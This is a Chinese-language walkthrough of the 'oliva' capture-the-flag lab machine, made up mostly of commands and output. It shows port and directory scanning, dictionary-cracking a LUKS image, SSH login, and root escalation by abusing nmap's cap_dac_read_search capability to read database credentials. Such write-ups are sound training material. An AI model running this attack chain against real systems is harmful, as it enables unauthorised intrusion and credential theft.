# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.9 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 23:29 EDT
Nmap scan report for oliva (192.168.2.9)
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:68:EE:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms oliva (192.168.2.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.44 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.9
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.9 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/oliva                (Status: 200) [Size: 20000000]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
```

下载下来看看是什么

```
┌──(kali㉿kali)-[~]
└─$ file oliva 
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

爆破一下

```
┌──(kali㉿kali)-[~]
└─$ bruteforce-luks -f /usr/share/wordlists/rockyou.txt -t 5 oliva
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 970
Tried passwords per second: 2.443325
Last tried password: pollito

Password found: bebita
```

看一下有什么

```
┌──(kali㉿kali)-[~]
└─$ sudo cryptsetup luksOpen oliva oliva     
[sudo] password for kali: 
Enter passphrase for oliva:
┌──(kali㉿kali)-[~]
└─$ sudo mkdir -p /mnt/oliva                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo mount /dev/mapper/oliva /mnt/oliva                                             
┌──(kali㉿kali)-[~]
└─$ ls -la /mnt/oliva
total 18
drwxr-xr-x 3 root root  1024 Jul  4  2023 .
drwxr-xr-x 4 root root  4096 Oct 17 00:32 ..
drwx------ 2 root root 12288 Jul  4  2023 lost+found
-rw-r--r-- 1 root root    16 Jul  4  2023 mypass.txt
┌──(kali㉿kali)-[/mnt/oliva]
└─$ cat mypass.txt    
Yesthatsmypass!
```

ssh连接

```
┌──(kali㉿kali)-[/mnt/oliva]
└─$ ssh oliva@192.168.2.9 
oliva@192.168.2.9's password: 
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  4 10:27:00 2023 from 192.168.0.100
oliva@oliva:~$
```

# 权限提升

寻找到nmap带capability，利用其读取到数据库的账号密码，从数据库中寻找到root的密码

```
oliva@oliva:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
oliva@oliva:/var/www/html$ nmap -iL index.php
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-17 06:38 CEST
Failed to resolve "Hi".
Failed to resolve "oliva,".
Failed to resolve "Here".
Failed to resolve "the".
Failed to resolve "pass".
Failed to resolve "to".
Failed to resolve "obtain".
Failed to resolve "root:".
Failed to resolve "<?php".
Failed to resolve "$dbname".
Failed to resolve "=".
Failed to resolve "'easy';".
Failed to resolve "$dbuser".
Failed to resolve "=".
Failed to resolve "'root';".
Failed to resolve "$dbpass".
Failed to resolve "=".
Failed to resolve "'Savingmypass';".
Failed to resolve "$dbhost".
Failed to resolve "=".
Failed to resolve "'localhost';".
Failed to resolve "?>".
Failed to resolve "<a".
Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.98 seconds
oliva@oliva:/var/www/html$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,010 sec)

MariaDB [(none)]> use easy
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [easy]> show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
1 row in set (0,000 sec)

MariaDB [easy]> select * from logging
    -> ;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
1 row in set (0,005 sec)
oliva@oliva:/var/www/html$ su -
Contraseña: 
root@oliva:~# id
uid=0(root) gid=0(root) grupos=0(root)
```
